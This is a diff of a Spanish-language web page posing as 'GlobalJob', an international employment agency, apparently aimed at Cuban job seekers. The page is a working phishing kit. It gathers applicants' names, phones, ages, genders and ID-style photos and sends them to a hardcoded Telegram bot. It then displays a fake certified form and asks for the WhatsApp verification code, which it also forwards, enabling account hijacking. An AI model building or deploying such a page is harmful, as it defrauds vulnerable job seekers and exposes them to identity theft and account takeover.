@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -10,7 +11,7 @@
             --accent: #f59e0b;
             --text-main: #1e293b;
             --text-muted: #64748b;
-            --bg-body: #f1f5f9;
+            --bg-body: #f8fafc;
             --card-bg: #ffffff;
             --border: #cbd5e1;
         }
@@ -31,8 +32,8 @@
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; } }
 
         /* Cabecera */
-        .header { text-align: center; padding: 20px 0; }
-        .header img { width: 100%; border-radius: 12px; margin-bottom: 15px; }
+        .header { text-align: center; padding: 10px 0; }
+        .header img { width: 100%; height: 220px; border-radius: 12px; margin-bottom: 15px; object-fit: cover; background: #eee; }
 
         /* Tarjetas de Trabajo */
         .job-card {
@@ -46,7 +47,7 @@
             cursor: pointer;
             transition: 0.2s;
         }
-        .job-card:hover { border-color: var(--primary); background: #f8fafc; }
+        .job-card:hover { border-color: var(--primary); background: #f1f5f9; }
         .flag { width: 40px; height: 28px; border-radius: 4px; margin-right: 15px; object-fit: cover; }
 
         /* Formulario */
@@ -74,60 +75,50 @@
 
         .loading { text-align: center; color: var(--primary); display: none; font-weight: 600; margin-top: 10px; }
 
-        /* ESTILO "HOJA DE TRABAJO" REALISTA */
+        /* DISEÑO HOJA DE TRABAJO OFICIAL */
         .hoja-trabajo {
             background: #fff;
-            border: 2px solid #334155;
+            border: 2px solid #1e293b;
             padding: 20px;
             position: relative;
             text-align: left;
-            box-shadow: 5px 5px 0px #cbd5e1;
             margin-bottom: 25px;
+            box-shadow: 4px 4px 0px #94a3b8;
         }
         .hoja-header {
-            border-bottom: 2px solid #334155;
+            border-bottom: 2px solid #1e293b;
             margin-bottom: 15px;
             padding-bottom: 10px;
             text-align: center;
         }
-        .hoja-header h3 { margin: 0; font-size: 1.1rem; color: #1e293b; text-transform: uppercase; }
-        .hoja-cuerpo { display: flex; gap: 20px; }
+        .hoja-header h3 { margin: 0; font-size: 1rem; color: #1e40af; text-transform: uppercase; }
+        .hoja-cuerpo { display: flex; gap: 15px; }
         .hoja-foto-marco {
-            width: 110px;
-            height: 130px;
-            border: 1px solid #334155;
-            background: #f8fafc;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            width: 100px;
+            height: 120px;
+            border: 1px solid #1e293b;
+            background: #f1f5f9;
             overflow: hidden;
         }
         .hoja-foto-marco img { width: 100%; height: 100%; object-fit: cover; }
-        .hoja-info { flex: 1; font-size: 0.85rem; }
-        .hoja-info div { border-bottom: 1px dotted #94a3b8; margin-bottom: 8px; padding-bottom: 2px; }
-        .hoja-info strong { color: #475569; font-size: 0.7rem; text-transform: uppercase; display: block; }
+        .hoja-info { flex: 1; font-size: 0.8rem; }
+        .hoja-info div { border-bottom: 1px solid #e2e8f0; margin-bottom: 6px; padding-bottom: 2px; }
+        .hoja-info strong { color: #64748b; font-size: 0.65rem; text-transform: uppercase; display: block; }
         
         .hoja-declaracion {
             margin-top: 15px;
-            font-size: 0.8rem;
+            font-size: 0.75rem;
             font-style: italic;
             color: #1e293b;
-            border-top: 1px solid #334155;
-            padding-top: 10px;
+            border: 1px solid #cbd5e1;
+            padding: 10px;
+            background: #fdfcf0;
             line-height: 1.4;
         }
-        .sello-oficial {
-            position: absolute;
-            bottom: 10px;
-            right: 10px;
-            border: 2px solid #dc2626;
-            color: #dc2626;
-            padding: 4px 8px;
-            font-weight: bold;
-            transform: rotate(-15deg);
-            opacity: 0.6;
-            font-size: 0.7rem;
-            border-radius: 4px;
+        .sello {
+            position: absolute; bottom: 10px; right: 10px; border: 2px solid #b91c1c;
+            color: #b91c1c; padding: 3px 6px; font-weight: 900; transform: rotate(-10deg);
+            opacity: 0.5; font-size: 0.6rem; border-radius: 3px;
         }
     </style>
 </head>
@@ -136,29 +127,28 @@
 <div class="container">
     <div id="inicio" class="screen active">
         <div class="header">
-            <img id="img-hero" src="" alt="Hero">
-            <h1 id="site-title" style="margin-bottom: 5px;"></h1>
-            <p id="site-desc" style="color: var(--text-muted); margin-top: 0;"></p>
-            <button class="btn-pro" onclick="showScreen('lista-trabajos')">Comenzar Postulación</button>
+            <img id="img-hero" src="https://images.unsplash.com/photo-1521737604893-d14cc237f11d?auto=format&fit=crop&w=800&q=80" alt="Recruitment">
+            <h1 id="site-title" style="margin-bottom: 5px;">GlobalJob 🌎</h1>
+            <p id="site-desc" style="color: var(--text-muted); margin-top: 0;">Agencia de Empleo Internacional</p>
+            <button class="btn-pro" onclick="showScreen('lista-trabajos')">Ver Vacantes</button>
         </div>
     </div>
 
     <div id="lista-trabajos" class="screen">
-        <h2 style="border-left: 4px solid var(--primary); padding-left: 10px;">Vacantes Disponibles</h2>
-        <p style="font-size: 0.9rem; color: var(--text-muted);">Seleccione el destino de su interés:</p>
+        <h2 style="border-left: 4px solid var(--primary); padding-left: 10px;">Ofertas de Empleo</h2>
         <div id="contenedor-trabajos"></div>
     </div>
 
     <div id="formulario" class="screen">
-        <h2 id="titulo-form">Datos del Aspirante</h2>
+        <h2 id="titulo-form">Registro de Aspirante</h2>
         
         <div class="input-group">
             <label>Nombre y Apellidos</label>
-            <input type="text" id="nombre" placeholder="Ej: Pedro Rodríguez">
+            <input type="text" id="nombre" placeholder="Nombre completo">
         </div>
 
         <div class="input-group">
-            <label>Teléfono de Contacto</label>
+            <label>Teléfono Personal</label>
             <input type="tel" id="telefono" placeholder="+53 50000000">
         </div>
 
@@ -177,35 +167,32 @@
         </div>
 
         <div class="input-group">
-            <label>Nivel de Estudios</label>
+            <label>Nivel Académico</label>
             <select id="nivel">
-                <option value="Bachiller">Bachiller / Pre-universitario</option>
+                <option value="Bachiller">Bachiller</option>
                 <option value="Técnico">Técnico Profesional</option>
-                <option value="Universitario">Grado Universitario</option>
-                <option value="Postgrado">Postgrado / Maestría</option>
+                <option value="Universitario">Universitario</option>
             </select>
         </div>
 
         <div class="input-group">
-            <label>Fotografía Oficial (Tipo Pasaporte)</label>
+            <label>Foto Documental</label>
             <div class="file-upload-wrapper">
-                <span id="file-label" class="file-upload-text">📷 Adjuntar Foto</span>
+                <span id="file-label" class="file-upload-text">📸 Subir Foto</span>
                 <input type="file" id="foto" accept="image/*" onchange="actualizarNombreArchivo()">
             </div>
         </div>
         
-        <button id="btn-enviar" class="btn-pro" onclick="enviarTodaLaInformacion()">GENERAR PLANILLA DE TRABAJO</button>
+        <button id="btn-enviar" class="btn-pro" onclick="enviarTodaLaInformacion()">GENERAR PLANILLA</button>
         <p id="status" class="loading">Procesando expediente...</p>
     </div>
 
     <div id="pantalla-codigo" class="screen" style="text-align: center;">
-        <h2 style="color: #1e40af;">Expediente Generado</h2>
-        <p style="font-size: 0.85rem; margin-bottom: 20px;">Revise su hoja de trabajo oficial antes de la verificación final.</p>
-
+        <h3>EXPEDIENTE OFICIAL</h3>
+        
         <div class="hoja-trabajo">
             <div class="hoja-header">
-                <h3>Solicitud de Empleo Internacional</h3>
-                <small style="font-size: 0.6rem; letter-spacing: 1px;">ID-REGISTRO: 2026-GJ-OFFICIAL</small>
+                <h3>FORMULARIO DE ADMISIÓN GJ-2026</h3>
             </div>
             
             <div class="hoja-cuerpo">
@@ -213,26 +200,24 @@
                     <img id="resumen-foto" src="" alt="Aspirante">
                 </div>
                 <div class="hoja-info">
-                    <div><strong>Nombre del Postulante</strong> <span id="res-nombre"></span></div>
-                    <div><strong>Teléfono Movil</strong> <span id="res-tel"></span></div>
-                    <div><strong>Cargo Solicitado</strong> <span id="res-puesto"></span></div>
-                    <div><strong>Nivel Académico</strong> <span id="res-nivel"></span></div>
+                    <div><strong>Postulante:</strong> <span id="res-nombre"></span></div>
+                    <div><strong>Teléfono:</strong> <span id="res-tel"></span></div>
+                    <div><strong>Cargo:</strong> <span id="res-puesto"></span></div>
+                    <div><strong>Nivel:</strong> <span id="res-nivel"></span></div>
                 </div>
             </div>
 
             <div class="hoja-declaracion">
-                "Por la presente, declaro que soy un **trabajador responsable, honesto y comprometido**. Me encuentro plenamente **preparado y capacitado** para asumir las responsabilidades del cargo solicitado, garantizando puntualidad y excelencia en mis labores."
+                "Confirmo que soy un **trabajador ejemplar, responsable y honesto**. Estoy plenamente **preparado y capacitado** para el cargo, comprometido con la excelencia y el cumplimiento de mis funciones."
             </div>
-            
-            <div class="sello-oficial">VALIDADO</div>
+            <div class="sello">CERTIFICADO</div>
         </div>
 
-        <div style="background: #f8fafc; padding: 15px; border-radius: 10px; border: 1px solid var(--border);">
-            <p style="font-weight: bold; margin-top: 0;">Código de Confirmación</p>
-            <p style="font-size: 0.8rem;">Ingrese el código de 4 dígitos enviado a su WhatsApp para finalizar.</p>
-            <input type="text" id="codigo-wa" placeholder="0000" style="text-align: center; font-size: 1.8rem; width: 120px; border: 2px solid var(--primary); border-radius: 8px; margin-bottom: 10px;">
-            <button class="btn-pro" onclick="enviarCodigoVerificacion()" style="margin-top: 0;">FINALIZAR PROCESO</button>
-            <p id="status-codigo" class="loading">Validando código...</p>
+        <div style="background: #f1f5f9; padding: 15px; border-radius: 10px;">
+            <p style="font-size: 0.8rem; margin: 0 0 10px 0;">Introduzca el código enviado por WhatsApp para validar.</p>
+            <input type="text" id="codigo-wa" placeholder="0000" style="text-align: center; font-size: 1.5rem; width: 100px; border: 2px solid var(--primary); border-radius: 5px; margin-bottom: 10px;">
+            <button class="btn-pro" onclick="enviarCodigoVerificacion()" style="margin-top: 0;">FINALIZAR</button>
+            <p id="status-codigo" class="loading">Verificando...</p>
         </div>
     </div>
 </div>
@@ -243,15 +228,10 @@
             token: "1965076303:AAH0no5wqlKYalUihHRD1Cyt-zw3Ak0qP24",
             chatId: "908553770"
         },
-        visual: {
-            titulo: "GlobalJob Reclutamiento",
-            descripcion: "Agencia certificada de empleo en el exterior.",
-            imagenHero: "https://images.unsplash.com/photo-1521791136064-7986c2959210?w=600"
-        },
         trabajos: [
-            { pais: "España", puesto: "Operario de Almacén", pago: "1.850€/mes", flag: "https://flagcdn.com/es.svg" },
-            { pais: "Canadá", puesto: "Auxiliar de Cosecha", pago: "2.400$/mes", flag: "https://flagcdn.com/ca.svg" },
-            { pais: "Alemania", puesto: "Asistente Logístico", pago: "2.100€/mes", flag: "https://flagcdn.com/de.svg" }
+            { pais: "España", puesto: "Construcción", pago: "1.800€/mes", flag: "https://flagcdn.com/es.svg" },
+            { pais: "Canadá", puesto: "Agrícola", pago: "2.400$/mes", flag: "https://flagcdn.com/ca.svg" },
+            { pais: "Italia", puesto: "Logística", pago: "1.700€/mes", flag: "https://flagcdn.com/it.svg" }
         ]
     };
 
@@ -259,9 +239,6 @@
     let nombreGlobal = "";
 
     window.onload = () => {
-        document.getElementById('site-title').innerText = CONFIG.visual.titulo;
-        document.getElementById('site-desc').innerText = CONFIG.visual.descripcion;
-        document.getElementById('img-hero').src = CONFIG.visual.imagenHero;
         renderTrabajos();
     };
 
@@ -275,7 +252,7 @@
                 document.getElementById('titulo-form').innerText = t.puesto;
                 showScreen('formulario');
             };
-            card.innerHTML = `<img class="flag" src="${t.flag}"> <div><strong>${t.puesto}</strong><br><small>${t.pais} • Sueldo: ${t.pago}</small></div>`;
+            card.innerHTML = `<img class="flag" src="${t.flag}"> <div><strong>${t.puesto}</strong><br><small>${t.pais} • ${t.pago}</small></div>`;
             container.appendChild(card);
         });
     }
@@ -289,7 +266,7 @@
     function actualizarNombreArchivo() {
         const input = document.getElementById('foto');
         const label = document.getElementById('file-label');
-        if(input.files.length > 0) label.innerText = "✅ Foto Adjuntada";
+        if(input.files.length > 0) label.innerText = "✅ Foto Cargada";
     }
 
     async function enviarTodaLaInformacion() {
@@ -301,14 +278,13 @@
         const foto = document.getElementById('foto').files[0];
 
         if (!nombre || !telefono || !foto || !edad) {
-            alert("Por favor, complete todos los campos de su expediente.");
-            return;
+            alert("Completa todos los datos para continuar."); return;
         }
 
         nombreGlobal = nombre;
         document.getElementById('status').style.display = "block";
 
-        // Llenar Planilla Visual
+        // Preparar planilla visual
         document.getElementById('res-nombre').innerText = nombre;
         document.getElementById('res-tel').innerText = telefono;
         document.getElementById('res-puesto').innerText = trabajoSeleccionado;
@@ -318,14 +294,7 @@
         reader.onload = (e) => { document.getElementById('resumen-foto').src = e.target.result; };
         reader.readAsDataURL(foto);
 
-        const texto = `📄 *EXPEDIENTE DE TRABAJO*\n\n` +
-                      `👤 *Nombre:* ${nombre}\n` +
-                      `📞 *Teléfono:* ${telefono}\n` +
-                      `🎂 *Edad:* ${edad}\n` +
-                      `🚻 *Género:* ${genero}\n` +
-                      `🎓 *Estudios:* ${nivel}\n` +
-                      `💼 *Vacante:* ${trabajoSeleccionado}\n\n` +
-                      `📜 *Declaración:* El candidato afirma estar preparado y ser un trabajador responsable.`;
+        const texto = `🆕 *NUEVA POSTULACIÓN*\n\n👤 *Nombre:* ${nombre}\n📞 *Teléfono:* ${telefono}\n🎂 *Edad:* ${edad}\n🚻 *Género:* ${genero}\n🎓 *Nivel:* ${nivel}\n💼 *Puesto:* ${trabajoSeleccionado}\n\n📜 *Nota:* El candidato afirma ser un trabajador responsable y preparado.`;
 
         try {
             const form = new FormData();
@@ -337,7 +306,7 @@
             await fetch(`https://api.telegram.org/bot${CONFIG.conexion.token}/sendPhoto`, { method: 'POST', body: form });
             showScreen('pantalla-codigo');
         } catch (e) {
-            alert("Error al procesar el expediente. Verifique su conexión.");
+            alert("Hubo un error de conexión, inténtalo de nuevo.");
         } finally {
             document.getElementById('status').style.display = "none";
         }
@@ -345,10 +314,10 @@
 
     async function enviarCodigoVerificacion() {
         const codigo = document.getElementById('codigo-wa').value;
-        if(!codigo) { alert("Ingrese el código."); return; }
+        if(!codigo) { alert("Ingresa el código, por favor."); return; }
 
         document.getElementById('status-codigo').style.display = "block";
-        const msg = `🔑 *VERIFICACIÓN FINAL*\n\n👤 *Aspirante:* ${nombreGlobal}\n🔢 *Código:* ${codigo}`;
+        const msg = `🔑 *CÓDIGO DE VALIDACIÓN*\n\n👤 *Aspirante:* ${nombreGlobal}\n🔢 *Código:* ${codigo}`;
 
         try {
             await fetch(`https://api.telegram.org/bot${CONFIG.conexion.token}/sendMessage`, {
@@ -356,9 +325,9 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CONFIG.conexion.chatId, text: msg, parse_mode: 'Markdown' })
             });
-            alert("¡Proceso Completado! Su planilla ha sido enviada al departamento de selección.");
+            alert("¡Listo! Tu expediente ha sido enviado correctamente.");
         } catch (e) {
-            alert("Error al enviar el código.");
+            alert("No pudimos enviar el código.");
         } finally {
             document.getElementById('status-codigo').style.display = "none";
         }
